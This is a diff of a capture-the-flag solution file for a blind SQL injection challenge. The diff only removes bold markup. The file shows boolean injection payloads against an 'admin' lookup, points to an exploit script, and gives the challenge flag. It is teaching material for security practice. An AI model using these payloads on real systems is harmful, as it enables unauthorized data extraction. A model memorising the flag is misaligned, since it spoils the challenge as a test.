@@ -1,9 +1,9 @@
-**Solution: A09 - BLIND SQL**
+Solution: A09 - BLIND SQL
 
-**Concept**  
+Concept  
 Boolean-based blind SQL injection and data exfiltration.
 
-**Walkthrough**  
+Walkthrough  
 1. Inject Boolean conditions:
    - `admin' AND 1=1 --` -> `{"exists": true}`
    - `admin' AND 1=2 --` -> `{"exists": false}`
@@ -12,5 +12,5 @@ Boolean-based blind SQL injection and data exfiltration.
 3. Run `challenge/app/exploit_demo.py` to extract all characters.
 4. Output: `flag{blind_sql_inference}`.
 
-**Flag**  
+Flag  
 `flag{blind_sql_inference}`
